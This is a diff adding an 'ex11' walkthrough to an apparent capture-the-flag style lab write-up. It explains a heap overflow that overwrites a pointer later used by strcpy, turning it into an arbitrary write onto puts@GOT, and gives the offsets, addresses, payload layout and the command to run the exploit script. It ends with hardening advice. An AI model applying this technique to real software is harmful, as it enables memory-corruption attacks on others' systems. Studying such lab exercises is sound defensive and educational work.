@@ -610,8 +610,51 @@ callable pointers in attacker-reachable structures.
 
 ---
 
-<!-- ex11 walkthrough is added when complete. -->
-_ex11: in progress._
+### ex11 — heap overflow → pointer corruption → write-what-where → GOT
+
+**Goal (`README.txt`):** see *“and we have a winner”*.
+
+**Vulnerability class:** heap overflow (CWE-122) that corrupts a **pointer later used as a `strcpy`
+destination**, yielding an arbitrary write used to overwrite the GOT.
+
+**Disassembly (`main`, structure):** two `{int val; void *ptr;}` structs are built on the heap:
+
+```asm
+ m1 = malloc(8); *m1 = 1; m1->ptr = malloc(8);    // -> m1b
+ m2 = malloc(8); *m2 = 2; m2->ptr = malloc(8);    // -> m2b
+ strcpy(m1->ptr, argv[1]);   ; strcpy into m1b     <-- unbounded overflow
+ strcpy(m2->ptr, argv[2]);   ; strcpy into *(m2->ptr)
+ puts("and that's a wrap folks!");
+```
+
+`winner()` at `0x08048494` prints *“and we have a winner @ …”*.
+
+**The chain:** the four chunks are consecutive. Overflowing `m1b` (via `argv[1]`) overwrites
+`m2->ptr`, which is the **destination** of the *second* `strcpy`. That makes the second `strcpy`
+an **arbitrary write**: `argv[1]` chooses *where* (the pointer value) and `argv[2]` is *what* is
+written there.
+
+- Set `m2->ptr = puts@GOT` (`0x08049774`) via `argv[1]`.
+- Set `argv[2] = &winner` (`0x08048494`).
+- The second `strcpy` writes `&winner` into `puts@GOT`; main's final `puts(...)` is
+  `jmp *puts@GOT` → `winner()` → win. (No RELRO ⇒ GOT is writable.)
+
+**Offset = 20.** `m1b → m2->ptr` is 20 bytes (each `malloc(8)` chunk is `0x10`). Brute-forced to be
+sure: 16 → no, **20 → win**, 24 → crash. Relative offset ⇒ independent of heap ASLR; GOT and winner
+are fixed (no PIE). All payload bytes are NUL-free.
+
+**Exploit (`scripts/ex11.py`):** `argv1 = "A"*20 + p32(puts@GOT)`, `argv2 = p32(winner)`.
+
+```bash
+python3 scripts/ex11.py /opt/hole-in-bin/ex11/bin
+```
+
+**Result (verified):** `and we have a winner @ <number>`.
+
+**Key takeaway:** the most dangerous overflow targets aren't always return addresses — corrupting a
+**pointer that the program later writes through** gives an arbitrary write, which is as powerful as
+direct EIP control. Validate sizes, isolate control data from user buffers, and enable Full RELRO +
+ASLR + heap hardening so a single overwrite can't reach the GOT.
 
 ---
 
